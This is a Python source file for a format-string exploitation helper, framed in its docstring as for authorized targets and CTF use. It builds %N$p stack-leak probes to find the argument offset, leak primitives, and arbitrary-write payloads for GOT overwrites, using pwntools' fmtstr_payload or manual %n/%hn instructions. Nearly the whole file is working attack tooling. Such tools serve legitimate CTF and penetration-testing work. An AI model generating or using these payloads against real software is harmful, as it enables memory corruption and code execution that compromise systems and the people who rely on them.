"""Format-string exploitation helper (infoleak + arbitrary write).

Given a printf-family sink with user-controlled format, this helps you: find the argument
offset, build a leak payload, and (with pwntools if available) build a GOT-overwrite write.
For AUTHORIZED targets / CTF only."""
from __future__ import annotations

from typing import Optional

try:
    from pwn import fmtstr_payload  # type: ignore
    _HAVE_PWN = True
except Exception:
    _HAVE_PWN = False


def leak_probe(max_index: int = 20) -> str:
    seq = ".".join(f"%{i}$p" for i in range(1, max_index + 1))
    return (f"# Send this to locate your input on the stack; count which %N$p echoes your marker.\n"
            f"# Prefix a marker so you can spot the offset, e.g. b'AAAA' + b'|' + payload\n"
            f"AAAA|{seq}")


def leak_at(index: int) -> str:
    return f"%{index}$p"


def write_payload(target_addr: int, value: int, offset: int, word: int = 8) -> str:
    if _HAVE_PWN:
        try:
            payload = fmtstr_payload(offset, {target_addr: value}, write_size=('byte' if word == 8 else 'short'))
            return ("# pwntools fmtstr_payload (offset=%d):\n" % offset) + "payload = " + repr(payload)
        except Exception as e:
            return f"# pwntools fmtstr_payload failed: {e}\n" + _manual_write(target_addr, value, offset)
    return _manual_write(target_addr, value, offset)


def _manual_write(target_addr: int, value: int, offset: int) -> str:
    return (f"# Manual %n write (install pwntools for automatic multi-byte payloads):\n"
            f"# write value={hex(value)} at addr={hex(target_addr)} using arg offset {offset}\n"
            f"# 1) place the target address in the stack, 2) use %<N>c to pad the counter,\n"
            f"#    3) %{offset}$n to write. For 4/8-byte values, split into %hn byte writes.\n")


def fmtstring_help(offset: Optional[int] = None, target_addr: Optional[str] = None,
                   value: Optional[str] = None) -> str:
    out = ["## Format-string helper\n"]
    if offset is None:
        out.append("### Step 1: find your argument offset\n```\n" + leak_probe() + "\n```")
        out.append("Then re-run with --offset N once you know which %N$p echoes your marker.")
        return "\n".join(out)
    out.append(f"### Leak primitive (offset {offset})\n```\n" + leak_at(offset) + "\n```")
    if target_addr and value:
        ta = int(str(target_addr), 0)
        val = int(str(value), 0)
        out.append(f"### Write primitive\n```\n" + write_payload(ta, val, offset) + "\n```")
    else:
        out.append("Provide --addr and --value to also generate a write (e.g. GOT overwrite).")
    return "\n".join(out)
